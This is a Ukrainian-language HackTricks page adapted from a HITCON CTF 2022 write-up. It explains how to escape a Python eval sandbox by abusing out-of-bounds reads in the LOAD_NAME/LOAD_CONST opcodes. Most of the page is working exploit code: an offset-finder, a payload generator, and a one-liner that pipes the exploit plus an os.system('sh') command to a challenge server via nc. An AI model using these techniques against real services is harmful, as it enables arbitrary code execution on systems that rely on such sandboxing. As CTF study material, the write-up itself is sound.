# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Ця інформація була взята** [**з цього опису**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ми можемо використовувати функцію OOB read в LOAD_NAME / LOAD_CONST opcode, щоб отримати деякий символ у пам'яті. Це означає використання трюку на кшталт `(a, b, c, ... сотні символів ..., __getattribute__) if [] else [].__getattribute__(...)`, щоб отримати символ (такий як ім'я функції), який вам потрібен.

Просто створіть свій експлойт.

### Overview <a href="#overview-1" id="overview-1"></a>

Джерельний код досить короткий, містить лише 4 рядки!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Ви можете ввести довільний код Python, і він буде скомпільований в [об'єкт коду Python](https://docs.python.org/3/c-api/code.html). Однак `co_consts` та `co_names` цього об'єкта коду будуть замінені на порожній кортеж перед eval цього об'єкта коду.

Таким чином, всі вирази, що містять константи (наприклад, числа, рядки тощо) або імена (наприклад, змінні, функції), можуть призвести до сегментаційної помилки в кінці.

### Читання за межами меж <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Як виникає сегментаційна помилка?

Почнемо з простого прикладу, `[a, b, c]` може бути скомпільовано в наступний байт-код.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Але що, якщо `co_names` стане порожнім кортежем? Опкод `LOAD_NAME 2` все ще виконується і намагається прочитати значення з тієї адреси пам'яті, з якої він спочатку повинен бути. Так, це функція читання за межами меж "особливість".

Основна концепція рішення проста. Деякі опкоди в CPython, наприклад `LOAD_NAME` і `LOAD_CONST`, вразливі (?) до OOB читання.

Вони отримують об'єкт з індексу `oparg` з кортежу `consts` або `names` (так називаються `co_consts` і `co_names` під капотом). Ми можемо звернутися до наступного короткого фрагмента про `LOAD_CONST`, щоб побачити, що CPython робить, коли обробляє опкод `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Таким чином, ми можемо використовувати функцію OOB, щоб отримати "ім'я" з довільного зсуву пам'яті. Щоб дізнатися, яке ім'я воно має і який у нього зсув, просто продовжуйте пробувати `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... І ви можете знайти щось приблизно при oparg > 700. Ви також можете спробувати використовувати gdb, щоб подивитися на розкладку пам'яті, звичайно, але я не думаю, що це буде легше?

### Генерація експлойту <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Як тільки ми отримаємо ці корисні зсуви для імен / констант, як _отримати_ ім'я / константу з цього зсуву і використовувати його? Ось трюк для вас:\
Припустимо, ми можемо отримати ім'я `__getattribute__` з зсуву 5 (`LOAD_NAME 5`) з `co_names=()`, тоді просто зробіть наступні дії:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Зверніть увагу, що немає необхідності називати його як `__getattribute__`, ви можете назвати його коротше або якось дивно

Ви можете зрозуміти причину, просто переглянувши його байт-код:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Зверніть увагу, що `LOAD_ATTR` також отримує ім'я з `co_names`. Python завантажує імена з одного й того ж зсуву, якщо ім'я однакове, тому другий `__getattribute__` все ще завантажується з offset=5. Використовуючи цю функцію, ми можемо використовувати довільне ім'я, як тільки ім'я знаходиться в пам'яті поблизу.

Для генерації чисел це має бути тривіально:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Я не використовував константи через обмеження довжини.

По-перше, ось скрипт, щоб знайти ці зсуви імен.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
А наступне призначене для створення реального експлойту на Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
В основному, це виконує такі дії, для тих рядків, які ми отримуємо з методу `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{{#include ../../../banners/hacktricks-training.md}}
